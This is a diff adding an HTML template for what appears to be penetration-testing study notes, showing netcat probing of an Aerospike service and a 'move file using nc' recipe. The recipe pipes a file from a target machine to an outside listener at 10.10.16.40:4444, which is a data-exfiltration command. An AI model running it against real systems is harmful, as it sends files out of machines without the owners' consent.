@@ -1,0 +1,36 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Unknown Service Check</h1>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA]
+└─$ nc -nv 192.168.116.143 3003
+(UNKNOWN) [192.168.116.143] 3003 (?) open</code></pre></div>
+<ul><li>If the service respondes, it might accespts help option.</li></ul>
+<div class="code-box"><pre><code>help
+bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;
+dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;
+log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;
+service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;
+statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;</code></pre></div>
+<ul>
+    <li>Several methods returned.</li>
+</ul>
+<div class="code-box"><pre><code>version
+Aerospike Community Edition build 5.1.0.1</code></pre></div>
+<ul><li>One of them may provide service name and version number.</li></ul>
+
+
+    <h1>Move file using nc!</h1>
+    <h2 class="blue">On the target machine</h2>
+    <div class="code-box"><pre><code>cat some_file | nc 10.10.16.40 4444</code></pre></div>
+    <h2 class="blue">On the local machine</h2>
+    <div class="code-box"><pre><code>nc -lvnp 4444 > file_name</code></pre></div>
+</body>
+</html>
